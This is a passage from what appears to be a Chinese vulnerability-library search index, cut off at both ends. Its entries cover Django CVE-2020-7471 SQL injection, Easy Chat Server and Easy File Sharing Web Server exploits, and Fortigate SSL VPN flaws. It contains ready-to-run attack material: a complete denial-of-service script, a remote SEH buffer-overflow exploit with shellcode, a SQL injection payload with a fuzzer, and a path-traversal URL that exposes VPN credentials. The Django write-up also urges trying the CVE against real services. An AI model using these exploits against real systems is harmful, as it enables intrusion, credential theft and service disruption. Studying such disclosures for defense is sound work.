\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Django/CVE-2020-7471%20Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20/#_1","title":"\u6f0f\u6d1e\u539f\u56e0","text":"<p>\u6458\u5f55 CVE-2020-7471 \u5bf9\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u63cf\u8ff0\uff1a</p> <p>Django 1.11 before 1.11.28, 2.2 before 2.2.10, and 3.0 befor    e 3.0.3 allows SQL Injection if untrusted data is used as a StringAgg  delimiter (e.g., in Django applications that offer downloads of data as a series of rows with a user-specified column delimiter). By passing a  suitably crafted delimiter to a contrib.postgres.aggregates.StringAgg  instance, it was possible to break escaping and inject malicious SQL.</p> <p>\u53ef\u4ee5\u770b\u89c1\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u6838\u5fc3\u662f StringAgg \u805a\u5408\u51fd\u6570\u7684 delimiter \u53c2\u6570\u5b58\u5728 SQL \u6ce8\u5165\u6f0f\u6d1e\u3002\u4f46\u662f\u5f88\u5feb\uff0c\u4e3a\u4ec0\u4e48\u5b58\u5728\u6f0f\u6d1e\uff1f\u600e\u4e48\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff1f\u4e8c\u4e2a\u95ee\u9898\u5728\u6211\u5fc3\u4e2d\u6cb9\u7136\u800c\u751f\uff0c\u597d\u5947\u5fc3\u9a71\u4f7f\u6211\u7ee7\u7eed\u5f80\u4e0b\u63a2\u7d22\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Django/CVE-2020-7471%20Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20/#_2","title":"\u5b98\u65b9\u4fee\u590d","text":"<p>\u9996\u5148\u5728 Github \u4ed3\u5e93\u67e5\u627e django \u7684 commit \u8bb0\u5f55\uff0c\u5728\u8fd9\u91cc\u4e0d\u96be\u53d1\u73b0\u5b98\u65b9\u5bf9\u5176\u7684\u4fee\u590d\uff1a</p> <p>https://github.com/django/django/commit/eb31d845323618d688ad429479c6dda973056136</p> <p></p> <p>\u4ece\u8fd9\u91cc\u6211\u4eec\u77e5\u9053\u51e0\u4e2a\u4fe1\u606f\uff0c\u6f0f\u6d1e\u51fd\u6570\u4f4d\u4e8e\u4e0b\u9762\u7684\u6a21\u5757\u4e4b\u4e2d</p> <pre><code>from django.contrib.postgres.aggregates import StringAgg\n</code></pre> <p>\u5b98\u65b9\u5bf9 delimiter \u4f7f\u7528\u5982\u4e0b\u8bed\u53e5\u5904\u7406\u6765\u9632\u5fa1 django</p> <pre><code>Value(str(delimiter))\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u8fd9\u79cd\u65b9\u5f0f\u80fd\u9632\u5fa1\u5462\uff1f\u9996\u5148\u8865\u5145\u4e00\u4e2a\u77e5\u8bc6\u70b9\uff0c\u5982\u679c\u4f60\u719f\u6089 django \u6216\u8005\u81f3\u5c11\u505a\u8fc7 django \u6e17\u900f\uff0c\u4f60\u5e94\u8be5\u77e5\u9053\u5728 django \u5f00\u53d1\u4e2d\u7f16\u5199\u67e5\u8be2\u64cd\u4f5c\u7684\u65f6\u5019\uff0c\u6b63\u786e\u7684\u505a\u6cd5\u662f\u7528\u4e0b\u9762\u7684\u4ee3\u7801\u6bb5\uff1a</p> <pre><code>sql = \"SELECT * FROM user_contacts WHERE username = %s\"\nuser = 'zhugedali'\ncursor.execute(sql, [user])\n</code></pre> <p>django\u4f1a\u6839\u636e\u4f60\u6240\u4f7f\u7528\u7684\u6570\u636e\u5e93\u670d\u52a1\u5668\uff08\u4f8b\u5982PostSQL\u6216\u8005MySQL\uff09\u7684\u8f6c\u6362\u89c4\u5219\uff0c\u81ea\u52a8\u8f6c\u4e49\u7279\u6b8a\u7684SQL\u53c2\u6570\u3002\u5982\u679c\u4f60\u7684\u67e5\u8be2\u4ee3\u7801\u50cf\u4e0b\u9762\u8fd9\u79cd\u5199\u6cd5\u5c31\u5b58\u5728\u6ce8\u5165\u7684\u98ce\u9669\uff1a</p> <pre><code>sql = \"SELECT * FROM user_contacts WHERE username = %s\" % 'zhugedali'\ncursor.execute(sql)\n</code></pre> <p>\u90a3\u4e48\u56de\u5230\u6b63\u9898\uff0c\u4e3a\u4ec0\u4e48 Value \u51fd\u6570\u53ef\u4ee5\u89e3\u51b3 SQL \u6ce8\u5165\u9690\u60a3\uff0c\u6211\u4eec\u8ddf\u8fdb django \u7684\u6e90\u7801\u67e5\u770b\uff1a</p> <p></p> <p>\u6ce8\u91ca\u5199\u7684\u975e\u5e38\u6e05\u695a\uff0cVlue\u5904\u7406\u8fc7\u7684\u53c2\u6570\u4f1a\u88ab\u52a0\u5230sql\u7684\u53c2\u6570\u5217\u8868\u91cc\uff0c\u4e4b\u540e\u4f1a\u88ab django \u5185\u7f6e\u7684\u8fc7\u6ee4\u673a\u5236\u8fc7\u6ee4\uff0c\u4ece\u800c\u9632\u8303 SQL \u6f0f\u6d1e\u3002</p> <p>\u5230\u8fd9\u91cc\u60f3\u5fc5\u5f88\u591a\u8bfb\u8005\u8fd8\u662f\u5f88\u597d\u5947\u5bf9\u4e8e\u5b58\u5728\u6f0f\u6d1e\u7684\u7248\u672c\u6211\u4eec\u5982\u4f55\u53bb\u5229\u7528 SQL \u6f0f\u6d1e\u5462\uff1f\u8fd9\u5c31\u9700\u8981\u8d39\u70b9\u65f6\u95f4\u53bb\u642d\u5efa\u73af\u5883\u5e76\u4ece\u6e90\u7801\u5c42\u9762\u5206\u6790\u51fa SQL \u6f0f\u6d1e\u70b9\u7684\u4e0a\u4e0b\u6587\u8bed\u53e5\u60c5\u51b5\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Django/CVE-2020-7471%20Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u6211\u642d\u5efa\u7684\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>django 3.0.2</li> <li>postgres 10.11-3</li> <li>python 3.6</li> </ul> <p>\u642d\u5efa\u73af\u5883\u7684\u65f6\u5019\u6ce8\u610f django \u914d\u7f6e\u597d settings.py \u6587\u4ef6\uff0c\u5e76\u521d\u59cb\u5316 postgres \u7684\u6570\u636e\u5e93\u548c\u6570\u636e\u8868\uff0c\u6587\u672b\u4f1a\u63d0\u4f9b\u73af\u5883\u3002</p> <p>\u9996\u5148\u7814\u7a76\u4e00\u4e0b StringAgg \u7684\u7528\u6cd5\uff0c\u76f4\u63a5\u9605\u8bfb\u5b98\u65b9\u624b\u518c\uff1a</p> <p>https://docs.djangoproject.com/en/3.0/ref/contrib/postgres/aggregates/</p> <p>django.contrib.postgres.aggregates \u63d0\u4f9b postggres \u7684\u805a\u5408\u51fd\u6570\uff0c\u5176\u4e2d\u7684 StringAgg \u7c7b\u7684\u53c2\u6570\u5982\u4e0b\uff1a</p> <p></p> <p>\u7b80\u5355\u6765\u8bb2\u4ed6\u4f1a\u5c06\u8f93\u5165\u7684\u503c\u4f7f\u7528 delimiter \u5206\u9694\u7b26\u7ea7\u8054\u8d77\u6765\uff0cDjango \u7684 Model \u7c7b\u5982\u4f55\u4f7f\u7528\u8fd9\u4e2a\u8ba9\u6211\u6478\u7d22\u4e86\u4e00\u4f1a\uff0c\u6211\u76f4\u63a5\u7ed9\u51fa\u540e\u9762\u4f1a\u63d0\u4f9b\u7684 POC \u91cc\u9762\u7684\u793a\u4f8b\uff1a</p> <pre><code>Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=\"-\"))\n</code></pre> <p>\u8fd9\u4e2a\u67e5\u8be2\u64cd\u4f5c\u5c31\u662f\u67e5\u8be2 Info \u5bf9\u5e94\u7684 postgres \u6570\u636e\u8868\u7684 gender \u5217\uff0c\u5e76\u5c06 name \u5217\u4f7f\u7528\u6a2a\u7ebf\u8fde\u63a5\u805a\u5408\uff0c\u8f93\u5165\u5982\u4e0b\uff1a</p> <p></p> <p>\u4e3a\u4e86\u6d4b\u8bd5\u51fa delimiter \u662f\u5982\u4f55\u5bfc\u81f4SQL \u6ce8\u5165\u7684\uff0c\u6211\u9996\u5148\u7f16\u5199\u4e86\u4e00\u6bb5 FUZZ \u7a0b\u5e8f\u7528\u4e8e\u5f15\u53d1\u7a0b\u5e8f\u62a5\u9519\uff1a</p> <pre><code>for c in \"!@#$%^&amp;*()_+=-|\\\\\\\"':;?/&gt;.&lt;,{}[]\":\n    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name',delimiter=c))\n    for e in results:\n        pass\n</code></pre> <p>\u6d4b\u8bd5\u53d1\u73b0\u5f53 delimiter \u662f\u5355\u5f15\u53f7\u7684\u65f6\u5019\u4f1a\u5bfc\u81f4\u62a5\u9519\uff1a</p> <p></p> <p>\u4ece\u62a5\u9519\u4fe1\u606f\u5f88\u660e\u663e\u770b\u51fa\u5355\u5f15\u53f7\u672a\u7ecf\u8fc7\u4efb\u4f55\u8f6c\u4e49\u5d4c\u5165\u5230 SQL \u8bed\u53e5\u4e2d\u4e86\u3002\u7136\u540e\u6211\u4eec\u6765\u8ffd\u8e2a\u7a0b\u5e8f\u7684\u5185\u90e8\u627e\u51fa\u5b8c\u6574\u7684 SQL \u8bed\u53e5\u4e0a\u4e0b\u6587\u3002</p> <p>\u6211\u4eec\u4e0a\u9762\u7684\u67e5\u8be2\u8bed\u53e5\u8c03\u7528\u4e86 self.cursor.execute\uff0c\u4ece\u53d8\u91cf\u7a97\u53e3\u53ef\u4ee5\u770b\u5230\u6b64\u65f6\u53d8\u91cf\u7a97\u53e3\u7684 sql \u53d8\u91cf\u8fd8\u6ca1\u6709\u5d4c\u5165 delimiter \u7684\u503c\u3002</p> <p></p> <p>\u5728 86 \u884c\u8bbe\u7f6e\u65ad\u70b9\uff0c\u518d\u8fd0\u884c\u4e09\u6b21\u53ef\u4ee5\u770b\u5230\u6b64\u65f6\u7684 sql \u5df2\u7ecf\u52a0\u5165\u4e86 delimiter \u4e3a\u5355\u5f15\u53f7\u7684\u53d6\u503c\uff1a</p> <p></p> <p>\u8fd9\u91cc\u7684\u8f6c\u4e49\u53f7\u662f\u56e0\u4e3a sql \u662f\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd9\u884c\u547d\u4ee4\u6700\u7ec8\u653e\u5165 postgres \u4e2d\u6267\u884c\u5c31\u53d8\u6210\u4e86\uff1a</p> <pre><code>SELECT \"vul_app_info\".\"gender\", STRING_AGG(\"vul_app_info\".\"name\", ''') AS \"mydefinedname\" FROM \"vul_app_info\" GROUP BY \"vul_app_info\".\"gender\" LIMIT 1 OFFSET 1\n</code></pre> <p>\u4e09\u4e2a\u5355\u5f15\u53f7\u90a3\u91cc\u4f1a\u5bfc\u81f4\u8bed\u6cd5\u9519\u8bef\uff0c\u5e76\u4e14\u6211\u4eec\u5c06\u5b8c\u6574\u7684 SQL \u6ce8\u5165\u4e0a\u4e0b\u6587\u73af\u5883\u5f97\u5230\u4e86\u3002\u5728\u6211\u7684 POC \u4e2d\u6211\u6d4b\u8bd5\u4e86 postgres \u7684\u6ce8\u91ca\u7b26\uff0c\u5373\u5c06 delimiter \u8bbe\u7f6e\u4e3a <code>')--</code>\uff0c\u62a5\u9519\u5982\u4e0b\uff1a</p> <p></p> <p>\u5f88\u660e\u663e\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6ce8\u91ca\u4e86 FROM \u8bed\u53e5\u3002\u4e3a\u4e86\u6784\u9020\u5408\u6cd5\u7684\u4e0a\u4e0b\u6587\u8bed\u53e5\u6211\u4eec\u5c06 delimiter \u8bbe\u7f6e\u4e3a\uff1a</p> <pre><code>'-\\') AS \"mydefinedname\" FROM \"vul_app_info\" GROUP BY \"vul_app_info\".\"gender\" LIMIT 1 OFFSET 1 -- '\n</code></pre> <p>\u4f20\u5165\u4e4b\u540e\u53d1\u73b0\uff0c\u8f93\u51fa\u662f\uff1a</p> <pre><code>{'gender': 'male', 'mydefinedname': 'li-zhao'}\n</code></pre> <p>\u5982\u679c\u53ea\u4f20\u5165 <code>delimiter = '-'</code>\uff0c\u8f93\u51fa\u5982\u4e0b\uff1a</p> <pre><code>{'gender': 'female', 'mydefinedname': 'zhang'}\n{'gender': 'male', 'mydefinedname': 'li-zhao'}\n</code></pre> <p>\u81f3\u6b64\u6f0f\u6d1e\u8bc1\u660e\u5b8c\u6bd5</p> <p>\u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u53ef\u4ee5\u601d\u8003\u8fd1\u671f\u5982\u679c\u9047\u5230\u771f\u5b9e\u73af\u5883\u4e2d\u6709 django \u5f00\u53d1\u7684\u670d\u52a1\u8fd4\u56de\u4e00\u4e9b\u67e5\u8be2\u7684\u805a\u5408\u5185\u5bb9\uff0c\u5e76\u4e14\u5141\u8bb8\u7528\u6237\u6307\u5b9a\u54ea\u79cd\u8fde\u63a5\u7b26\u7684\u65f6\u5019\uff0c\u5e94\u8be5\u591a\u52a0\u601d\u8003\u662f\u5426\u8be5\u670d\u52a1\u672a\u66f4\u65b0\u4e3a\u6700\u65b0\u7248\u672c\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a CVE \u6f0f\u6d1e\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Django/CVE-2020-7471%20Django%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20/#poc","title":"\u6f0f\u6d1e\u73af\u5883\u548c POC","text":"<p>https://github.com/Saferman/CVE-2020-7471</p> <p>\u6838\u5fc3\u51fd\u6570\u5982\u4e0b:</p> <pre><code>def query_with_evil():\n    '''\n    \u6ce8\u5165\u70b9\u8bc1\u660e\n    \u5206\u522b\u8bbe\u7f6edelimiter\u4e3a \u5355\u5f15\u53f7 \u4e8c\u4e2a\u5355\u5f15\u53f7 \u4e8c\u4e2a\u53cc\u5f15\u53f7\n    \u5c1d\u8bd5\u6ce8\u91ca\u540e\u9762\u7684\u5185\u5bb9 ')--\n    :return:\n    '''\n    print(\"[+]\u6b63\u5e38\u7684\u8f93\u51fa\uff1a\")\n    payload = '-'\n    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))\n    for e in results:\n        print(e)\n    print(\"[+]\u6ce8\u5165\u540e\u7684\u7684\u8f93\u51fa\uff1a\")\n    payload = '-\\') AS \"mydefinedname\" FROM \"vul_app_info\" GROUP BY \"vul_app_info\".\"gender\" LIMIT 1 OFFSET 1 -- '\n    results = Info.objects.all().values('gender').annotate(mydefinedname=StringAgg('name', delimiter=payload))\n    for e in results:\n        print(e)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20Chat%20Server/Easy%20Chat%20Server%203.1%20%E2%80%98message%E2%80%99%20Denial%20of%20Service/","title":"Easy Chat Server 3.1 \u2018message\u2019 Denial of Service","text":"<pre><code>#!/usr/bin/python\n#---------------------------------------------------------\n# Title: Easy Chat Server Version 3.1 - (DOS)\n# Date: 2019-05-07\n# Author: Miguel Mendez Z\n# Team: www.exploiting.cl\n# Vendor: http://www.echatserver.com\n# Software Link: http://www.echatserver.com/ecssetup.exe\n# Platforms: Windows\n# Version: 3.1\n# Tested on: Windows Windows 7_x86/7_x64 [eng]\n#---------------------------------------------------------\n#\n# 1- Primer socket con (GET) generamos una sesion valida para luego hacer el paso 2.\n# 2- Segundo enviamos (POST) la data en la variable message para crashear la aplicacion.\n\nimport os, sys, socket\nfrom time import sleep\n\nip = '127.0.0.1'\npadding = 'A' * 8000\n\nGET = (\n\"GET /chat.ghp?username=1&amp;password=&amp;room=1&amp;sex=1 HTTP/1.1\\r\\n\"\n\"User-Agent: Mozilla/4.0\\r\\n\"\n\"Host: \"+str(ip)+\":80\\r\\n\"\n\"Accept-Language: en-us\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"Referer: http://\"+str(ip)+\"\\r\\n\"\n\"Connection: Keep-Alive\\r\\n\\r\\n\"\n)\n\ntry:\n  print \"\\n [*] Ejecutando payload GET (Creando Sesion) - length \" + str(len(GET))\n  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s1.connect((ip, 80))\n  s1.send(GET)\n  s1.recv(1024)\n  s1.close()\nexcept:\n  print \"Sin conexion GET\"\n\nsleep(3)\n\nPOST = (\n\"POST /body2.ghp?username=1&amp;password=&amp;room=1 HTTP/1.1\\r\\n\"\n\"Host: \"+str(ip)+\"\\r\\n\"\n\"User-Agent: Mozilla/4.0\\r\\n\"\n\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n\"\n\"Accept-Language: es-CL,en-US;q=0.5\\r\\n\"\n\"Accept-Encoding: gzip, deflate\\r\\n\"\n\"Referer: http://\"+str(ip)+\"/chatsubmit.ghp?username=1&amp;password=&amp;room=1\\r\\n\"\n\"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\"\n\"staticname=%3A000539&amp;tnewname=&amp;msayinfo=1&amp;mnewname=&amp;mtowho=All&amp;mfilters=0&amp;mfont=0&amp;mfcolor=1&amp;elist=&amp;seltype=Theme&amp;msg=&amp;Submit=Send&amp;sc=on&amp;notifysound=on&amp;message=\"+str(padding)+\"&amp;chat_flag=\"\n)\n\ntry:\n  print \" [*] Ejecutando payload POST (Crashing) - length \" + str(len(POST))\n  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  s2.connect((ip, 80))\n  s2.send(POST)\n  s2.recv(1024)\n  s2.close()\nexcept:\n  print \"Sin conexion POST\"\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/","title":"Easy File Sharing Web Server 7.2   GET \u7f13\u51b2\u533a\u6ea2\u51fa (SEH)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/#easy-file-sharing-web-server-72-get-seh","title":"Easy File Sharing Web Server 7.2 - GET \u7f13\u51b2\u533a\u6ea2\u51fa (SEH)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/#poc","title":"POC","text":"<pre><code># Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow\n# Tested on: XP SP3 EN\n# category: Remote Exploit\n# Usage: ./exploit.py ip port\n\nimport socket\nimport sys\n\nhost = str(sys.argv[1])\nport = int(sys.argv[2])\n\na = socket.socket()\n\nprint \"Connecting to: \" + host + \":\" + str(port)\na.connect((host,port))\n\nentire=4500\n\n# Junk\nbuff = \"A\"*4061\n\n# Next SEH\nbuff+= \"\\xeb\\x0A\\x90\\x90\"\n\n# pop pop ret\nbuff+= \"\\x98\\x97\\x01\\x10\"\n\nbuff+= \"\\x90\"*19\n\n# calc.exe\n# Bad Characters: \\x20 \\x2f \\x5c\nshellcode = (\n\"\\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9\"\n\"\\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56\"\n\"\\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9\"\n\"\\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97\"\n\"\\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64\"\n\"\\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8\"\n\"\\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a\"\n\"\\x1c\\x39\\xbd\"\n)\nbuff+= shellcode\n\nbuff+= \"\\x90\"*7\n\nbuff+= \"A\"*(4500-4061-4-4-20-len(shellcode)-20)\n\n# GET\na.send(\"GET \" + buff + \" HTTP/1.0\\r\\n\\r\\n\")\n\na.close()\n\nprint \"Done...\"\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/","title":"Fortigate SSL VPN\u591a\u4e2a\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#fortigate","title":"Fortigate","text":"<p>\u98de\u5854\u9632\u706b\u5899\u8bbe\u5907\u7684\u4e13\u7528\u540d\u8bcd\uff0cFortinet\u662f\u98de\u5854\u7684\u54c1\u724c\uff0c\u800cFortiGate  \u662f\u6307\u98de\u5854\u786c\u4ef6\u3002Fortinet\u7684\u5c61\u83b7\u6b8a\u8363\u7684FortiGate\u7cfb\u5217\uff0c\u662f\u91c7\u7528ASIC\u52a0\u901f\u7684UTM\u89e3\u51b3\u65b9\u6848\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u5fa1\u7f51\u7edc\u5c42\u548c\u5185\u5bb9\u5c42\u7684\u653b\u51fb\u3002FortiGate\u89e3\u51b3\u65b9\u6848\u80fd\u591f\u53d1\u73b0\u548c\u6d88\u9664\u591a\u5c42\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u75c5\u6bd2\u3001\u8815\u866b\u3001\u5165\u4fb5\u3001\u4ee5\u53caWeb\u6076\u610f\u5185\u5bb9\u7b49\u7b49\u5b9e\u65f6\u7684\u5e94\u7528\uff0c\u800c\u4e0d\u4f1a\u5bfc\u81f4\u7f51\u7edc\u6027\u80fd\u4e0b\u964d\u3002\u5b83\u6240\u6d89\u53ca\u5230\u7684\u5168\u9762\u7684\u5b89\u5168\u4f53\u7cfb\u662f\u6db5\u76d6\u9632\u75c5\u6bd2/\u53cd\u5783\u573e\u90ae\u4ef6\u3001\u9632\u706b\u5899\u3001VPN\u3001\u5165\u4fb5\u68c0\u6d4b\u548c\u9632\u5fa1\u3001\u53cd\u5783\u573e\u90ae\u4ef6\u548c\u6d41\u91cf\u4f18\u5316\u3002\u9664\u4e86FortiGate\u4ee5\u5916\uff0cFortinet\u8fd8\u63d0\u4f9bFortiMail\u8fd9\u6837\u7684\u90ae\u4ef6\u5b89\u5168\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u548c\u7ec8\u7aef\u3001\u667a\u80fd\u624b\u673a\u5b89\u5168\u7684 FortiClient\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#cve-2018-13379-pre-auth","title":"CVE-2018-13379: Pre-auth\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Fortinet FortiOS\u8def\u5f84\u904d\u5386\u6f0f\u6d1e\uff08CNNVD-201905-1026\u3001CVE-2018-13379\uff09</p> <p>\u6f0f\u6d1e\u6e90\u4e8e\u8be5\u7cfb\u7edf\u672a\u80fd\u6b63\u786e\u5730\u8fc7\u6ee4\u8d44\u6e90\u6216\u6587\u4ef6\u8def\u5f84\u4e2d\u7684\u7279\u6b8a\u5143\u7d20\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u8bbf\u95ee\u53d7\u9650\u76ee\u5f55\u4ee5\u5916\u7684\u4f4d\u7f6e\u3002Fortinet FortiOS 5.6.3\u7248\u672c\u81f35.6.7\u7248\u672c\u30016.0.0\u7248\u672c\u81f36.0.4\u7248\u672c\u4e2d\u7684SSL VPN \u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>Fortinet FortiOS 5.6.3\u7248\u672c\u81f35.6.7\u7248\u672c\u3001Fortinet FortiOS 6.0.0\u7248\u672c\u81f36.0.4\u7248\u672c\u4e2d\u7684SSL VPN \u53d7\u6b64\u6f0f\u6d1e\u5f71\u54cd\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_3","title":"\u590d\u73b0\u8fc7\u7a0b","text":"<p>\u53ef\u8bbf\u95ee\u94fe\u63a5\u67e5\u770b\u662f\u5426\u5b58\u5728\u6f0f\u6d1e</p> <pre><code>/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\n</code></pre> <p>\u53ef\u67e5\u770b\u7528\u6237\u540d\u3001\u5bc6\u7801</p> <p>\u53ef\u76f4\u63a5\u767b\u5f55\u6210\u529f\u3002</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_4","title":"\u68c0\u6d4b\u5de5\u5177","text":"<pre><code>https://github.com/ianxtianxt/CVE-2018-13379\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#cve-2018-13380-fortinet-fortios-xss","title":"CVE-2018-13380 Fortinet FortiOS xss\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Fortigate%20SSL%20VPN/Fortigate%20SSL%20VPN%E5%A4%9A%E4%B8%AA%E6%BC%8F%E6%B4%9E/#_5","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Fortinet  FortiOS\u662f\u7f8e\u56fd\u98de\u5854\uff08Fortinet\uff09\u516c\u53f8\u7684\u4e00\u5957\u4e13\u7528\u4e8eFortiGate\u7f51\u7edc\u5b89\u5168\u5e73\u53f0\u4e0a\u7684\u5b89\u5168\u64cd\u4f5c\u7cfb\u7edf\u3002\u8be5\u7cfb\u7edf\u4e3a\u7528\u6237\u63d0\u4f9b\u9632\u706b\u5899\u3001\u9632\u75c5\u6bd2\u3001IPSec/SSLVPN\u3001Web\u5185\u5bb9\u8fc7\u6ee4\u548c\u53cd\u5783\u573e\u90ae\u4ef6\u7b49\u591a\u79cd\u5b89\u5168\u529f\u80fd\u3002 Fortinet FortiOS 6.0.0\u7248\u672c\u81f36.0.4\u7248\u672c\u30015.6.0\u7248\u672c\u81f35.6.7\u7248\u672c\u548c5.4\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\u7684SSL VPN  